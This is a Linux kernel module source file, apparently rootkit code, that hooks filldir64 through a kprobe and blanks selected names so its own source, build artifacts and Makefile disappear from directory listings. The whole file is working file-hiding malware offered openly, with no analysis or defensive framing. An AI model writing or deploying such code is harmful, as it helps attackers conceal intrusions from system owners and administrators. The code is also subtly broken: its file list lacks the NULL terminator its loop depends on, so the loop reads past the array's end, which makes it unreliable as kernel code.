// SPDX-License-Identifier: GPL-2.0-only
/*
 * https://github.com/torvalds/linux/blob/master/samples/kprobes/kprobe_example.c
 * https://github.com/c3l3si4n/robson
 */

#define pr_fmt(fmt) "%s: " fmt, __func__

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>

#ifdef DEBUG
#define dbg_print(fmt, ...) pr_info(fmt, ##__VA_ARGS__)
#else
#define dbg_print(fmt, ...) /* No-op */
#endif

static const char *files_to_hide[] = {
	"file_hide",	   "file_hide.c",     "file_hide.ko", "file_hide.mod",
	"file_hide.mod.c", "file_hide.mod.o", "file_hide.o",  "Makefile",
	"modules.order",   "Module.symvers",
};

/* For each probe you need to allocate a kprobe structure */
static struct kprobe kp = {
	.symbol_name = "filldir64",
};

/* kprobe pre_handler: called just before the probed instruction is executed */
static int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs)
{
	char *filename = (char *)regs->si;
	const char **file;

	dbg_print(
		"<%s> p->addr = 0x%p, ip = %lx, rdi=%lx, rsi=%s ,flags = 0x%lx\n",
		p->symbol_name, p->addr, regs->ip, regs->di, (char *)regs->si,
		regs->flags);
	for (file = files_to_hide; *file != NULL; file++) {
		if (strcmp(filename, *file) == 0) {
			dbg_print("Hiding file: %s\n", filename);
			strcpy((char *)regs->si, "\x00");
		}
	}

	return 0;
}

static int __init file_hide_init(void)
{
	int ret;
	kp.pre_handler = handler_pre;

	ret = register_kprobe(&kp);
	if (ret < 0) {
		dbg_print("register_kprobe failed, returned %d\n", ret);
		return ret;
	}
	dbg_print("filldir64: %px\n", kp.addr);
	return 0;
}

static void __exit file_hide_exit(void)
{
	unregister_kprobe(&kp);
	dbg_print("file_hide exit successfully\n");
}

module_init(file_hide_init) module_exit(file_hide_exit)
	MODULE_AUTHOR("MikeHorn-git");
MODULE_DESCRIPTION("file_hide");
MODULE_LICENSE("GPL");
